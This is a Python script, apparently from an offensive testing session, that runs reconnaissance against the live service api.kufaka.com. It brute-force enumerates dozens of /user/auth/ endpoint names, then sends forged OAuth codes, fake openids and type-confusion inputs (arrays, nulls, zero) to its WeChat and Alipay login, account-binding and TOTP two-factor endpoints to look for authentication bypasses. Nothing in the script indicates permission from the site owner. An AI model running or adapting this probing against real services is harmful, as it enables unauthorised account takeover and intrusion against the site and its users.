#!/usr/bin/env python3
# i3214 recon: enumerate + probe api.kufaka.com /user/auth/* third-party login / bind / 2FA
import json, sys, urllib.request, urllib.error, urllib.parse, http.cookiejar

BASE = "https://api.kufaka.com"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

def mkop():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar)), jar

def req(path, method="GET", body=None, extra=None, timeout=22, op=None):
    h = {"User-Agent": UA, "Accept": "application/json, text/plain, */*",
         "Accept-Language": "zh-CN,zh;q=0.9", "Origin": BASE,
         "Referer": BASE + "/user/", "X-Requested-With": "XMLHttpRequest"}
    if extra: h.update(extra)
    data = None
    if body is not None:
        if isinstance(body, dict):
            data = urllib.parse.urlencode(body).encode()
            h["Content-Type"] = "application/x-www-form-urlencoded"
        else:
            data = body if isinstance(body, bytes) else body.encode()
            h.setdefault("Content-Type", "application/json")
    rq = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        r = op.open(rq, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore"), r.headers
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore"), e.headers
    except Exception as e:
        return 0, "ERR " + str(e)[:120], {}

def show(tag, method, path, st, b, hdrs):
    sc = hdrs.get("Set-Cookie")
    print("%-30s %-4s %-34s -> %s | %s%s" % (
        tag, method, path, st, " ".join(b.split())[:280],
        (" [SC:%s]" % sc[:60]) if sc else ""), flush=True)

def main():
    op, jar = mkop()
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=15) as r:
            print("EGRESS_IP", r.read().decode(), flush=True)
    except Exception as e:
        print("EGRESS_IP ERR", e, flush=True)

    # 0) baseline reachability
    for p in ["/user/auth/checkLogin", "/user/auth/login"]:
        st, b, h = req(p, "GET", op=op); show("base", "GET", p, st, b, h)

    # 1) enumerate /user/auth/* actions
    print("\n== ACTION ENUM (GET, then POST empty) ==", flush=True)
    acts = ["login","checkLogin","logout","wxLogin","wxlogin","wxCallback","wxCallBack","wxcallback",
            "wxLoginCallback","wxReturn","alipayLogin","alipaylogin","alipayCallback","alipayCallBack",
            "alipayReturn","connect","disconnect","bind","unbind","bindCallback","totp","verifyTotp",
            "verifyCode","setupTotp","2fa","twofa","googleAuth","gauth","sms","sendcode","email",
            "reg","register","findpwd","captcha","getPublicKey","getcode","oauth","callback","notify"]
    for a in acts:
        p = "/user/auth/" + a
        st, b, h = req(p, "GET", op=op); show("enum-G", "GET", p, st, b, h)
        st, b, h = req(p, "POST", {}, op=op); show("enum-P", "POST", p, st, b, h)

    # 2) deep probe the four targets with plausible params
    print("\n== DEEP PROBE ==", flush=True)
    deep = [
        # wxLogin / alipayLogin: OAuth callback style params
        ("/user/auth/wxLogin", "POST", {"code":"test_code_1","state":"teststate"}),
        ("/user/auth/wxLogin", "POST", {"code":"test_code_1"}),
        ("/user/auth/wxLogin", "POST", {"openid":"testopenid123","unionid":"testunion123","nickname":"t"}),
        ("/user/auth/wxLogin", "GET",  None),
        ("/user/auth/wxLogin", "POST", {"code":"","state":""}),
        ("/user/auth/alipayLogin", "POST", {"auth_code":"test_auth_code","state":"teststate"}),
        ("/user/auth/alipayLogin", "POST", {"code":"test_code_1","state":"teststate"}),
        ("/user/auth/alipayLogin", "POST", {"user_id":"2088000000000000","openid":"t"}),
        ("/user/auth/alipayLogin", "GET",  None),
        ("/user/auth/alipayLogin", "POST", {"code":"","state":""}),
        ("/user/auth/alipayLogin", "POST", {"code":"test","app_id":"2021000000000000","sign":"x"}),
        # connect (bind third-party)
        ("/user/auth/connect", "POST", {"type":"wx"}),
        ("/user/auth/connect", "POST", {"type":"alipay"}),
        ("/user/auth/connect", "POST", {"type":"wx","code":"t","openid":"t"}),
        ("/user/auth/connect", "POST", {"type":""}),
        ("/user/auth/connect", "GET",  None),
        ("/user/auth/connect", "POST", {"type[]":"wx"}),
        ("/user/auth/connect", "POST", {"type":"wx","uid":1001,"pid":1001}),
        # totp
        ("/user/auth/totp", "POST", {"code":"000000"}),
        ("/user/auth/totp", "POST", {"code":""}),
        ("/user/auth/totp", "POST", {}),
        ("/user/auth/totp", "POST", {"code":0}),
        ("/user/auth/totp", "POST", {"code[]":"000000"}),
        ("/user/auth/totp", "POST", {"code":None}),
        ("/user/auth/totp", "POST", {"code":"000000","user":"ceshi"}),
        ("/user/auth/totp", "GET",  None),
        ("/user/auth/totp", "POST", {"verify_code":"000000","type":"totp"}),
    ]
    for path, m, body in deep:
        st, b, h = req(path, m, body, op=op)
        show("deep", m, path + ((" " + json.dumps(body, ensure_ascii=False)) if body else ""), st, b, h)

main()
